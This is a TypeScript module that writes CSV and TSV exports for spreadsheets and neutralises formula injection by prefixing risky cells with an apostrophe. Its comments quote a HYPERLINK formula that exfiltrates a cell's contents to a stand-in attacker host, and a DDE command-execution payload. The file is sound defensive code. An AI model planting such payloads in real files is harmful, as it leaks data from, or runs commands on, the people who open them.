/**
 * Writers for the delimited files researchers hand to Excel / Sheets / SPSS.
 *
 * (`csv.ts` holds `parseCsvRecords`, the lossy *reader* used on import - it
 * trims fields and drops blank rows, so it must not be used to check an
 * export.)
 */

/**
 * Byte-order mark. Windows Excel decodes a .csv as the local ANSI code page
 * unless the file starts with this, which turns e.g. "Coopération" into
 * "CoopÃ©ration".
 */
export const UTF8_BOM = '\uFEFF';

/**
 * Excel, Sheets and LibreOffice read a leading `=`, `+`, `-`, `@`, tab or CR in
 * an imported cell as the start of a formula. RFC 4180 quoting does NOT stop
 * that — the quotes are stripped during import and the value is evaluated, so
 * a coded excerpt reading `=HYPERLINK("http://evil.example/?d="&A1,"Click")`
 * becomes a live exfiltration link in the researcher's spreadsheet.
 *
 * The .xlsx writer solves this by pinning the cell to the Text number format
 * (`excelExport.ts`), which a delimited file has no way to express. The
 * remaining option is the leading apostrophe: every spreadsheet treats it as
 * "the rest is text", strips it on display, and keeps the value inert.
 *
 * Leading whitespace does not reliably protect the cell: some import paths
 * (Excel's CSV import wizard, LibreOffice with "trim spaces") strip it before
 * deciding whether the cell is a formula, so ` =1+1` is treated exactly like
 * `=1+1`. The guard therefore looks at the first NON-whitespace character.
 *
 * Only cells that would otherwise be evaluated are touched, so ordinary text
 * is byte-identical to before.
 */
const FORMULA_PREFIX = /^\s*[=+\-@\t\r]/;

export function neutralizeFormula(value: string): string {
  return FORMULA_PREFIX.test(value) ? `'${value}` : value;
}

/** RFC 4180 field: always quoted, embedded quotes doubled, formulas defused. */
export function escapeCsvField(value: string): string {
  return `"${neutralizeFormula(value).replace(/"/g, '""')}"`;
}

/**
 * Tab-separated field for the clipboard. Excel and Sheets honour quoting on
 * paste, which is the only way an excerpt containing a tab or a line break can
 * land in a single cell. Ordinary values are left bare so pasting into a text
 * editor still looks like a table.
 */
export function escapeTsvField(value: string): string {
  // Same formula guard as CSV — the TSV path emitted `=cmd|' /C calc'!A0`
  // completely bare, and a clipboard paste lands in the same spreadsheet.
  const safe = neutralizeFormula(value);
  return /[\t\n\r"]/.test(safe) ? `"${safe.replace(/"/g, '""')}"` : safe;
}
